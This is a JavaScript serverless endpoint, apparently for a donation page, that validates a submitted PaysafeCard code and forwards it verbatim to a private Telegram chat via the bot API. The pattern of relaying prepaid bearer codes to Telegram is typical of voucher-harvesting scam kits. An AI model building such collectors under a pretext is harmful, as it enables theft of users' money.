export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({
            error: 'Méthode non autorisée'
        });
    }

    const { code } = req.body || {};

    if (!code) {
        return res.status(400).json({
            error: 'Code requis'
        });
    }

    const cleanCode = String(code).replace(/\s/g, '');

    if (!/^0\d{15}$/.test(cleanCode)) {
        return res.status(400).json({
            error: 'Code PaysafeCard invalide.'
        });
    }

    try {
        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;

        if (!telegramBotToken || !telegramChatId) {
            return res.status(500).json({
                error: 'Configuration Telegram manquante'
            });
        }

        const response = await fetch(
            `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: `${cleanCode}`
                })
            }
        );

        const data = await response.json();

        if (!response.ok || !data.ok) {
            console.error('Erreur Telegram:', data);

            return res.status(500).json({
                error: 'Erreur lors de l\'envoi du code'
            });
        }

        return res.status(200).json({
            success: true,
            message: 'Code envoyé avec succès. BaarakaAllahu fik pour votre don.'
        });

    } catch (error) {
        console.error('Erreur Telegram:', error);

        return res.status(500).json({
            error: 'Erreur lors de l\'envoi du code'
        });
    }
}
